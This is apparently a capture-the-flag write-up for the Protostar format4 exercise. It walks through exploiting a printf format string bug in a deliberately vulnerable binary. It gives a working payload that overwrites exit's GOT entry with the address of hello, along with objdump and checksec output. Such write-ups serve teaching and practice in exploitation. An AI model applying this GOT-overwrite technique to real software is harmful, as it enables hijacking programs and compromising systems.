# Protostar - Format 4

### About ###

>%p format4 looks at one method of redirecting execution in a process.
>
>**Hints**
>
> - objdump -TR is your friend
> 
>This level is at `/opt/protostar/bin/format4`


### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```

### Solution 

The point of this challenge is to change the saved `eip` in order to redirect the flow of execution to the function `hello`.

There is no full or partial RELRO, which means we can change the values of the GOT. More details about this type of exploitation can be found [here](http://phrack.org/issues/56/7.html) [1].

```
user@protostar:/tmp$ ./checksec.sh --file /opt/protostar/bin/format4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /opt/protostar/bin/format4
```

Since we want redirect the execution to `hello`, we will need to change the GOT entry of a function following the exploitation of the format string bug. In our case, we don't have much of a choice, we have to change the GOT entry of the function `exit`.

`objdump` tells us that the GOT entry of `exit` is at the address `0x08049724`.

```
user@protostar:/tmp$ objdump -TR /opt/protostar/bin/format4
[...]
08049724 R_386_JUMP_SLOT   exit
```

We are going to change the content of that memory location by the address of `hello` which is `0x080484b4`.

```
user@protostar:/tmp$ objdump -t /opt/protostar/bin/format4 | grep hello
080484b4 g     F .text 	0000001e              hello
```

At this point, the remaining steps are the same than in the previous exercise and with the following format string, we are able to change the GOT entry of `exit` and redirect the execution to the function `hello`.

```
\x24\x97\x04\x08\x26\x97\x04\x08%33964c%4$n%33616c%5$n
```

```
user@protostar:/tmp$ python -c "print '\x24\x97\x04\x08\x26\x97\x04\x08%33964c%4\$n%33616c%5\$n'" | format4
[...]
code execution redirected! you win
```
 

### References

 * [1] Shared Library Call Redirection Via Elf PLT Infection, [http://phrack.org/issues/56/7.html](http://phrack.org/issues/56/7.html)

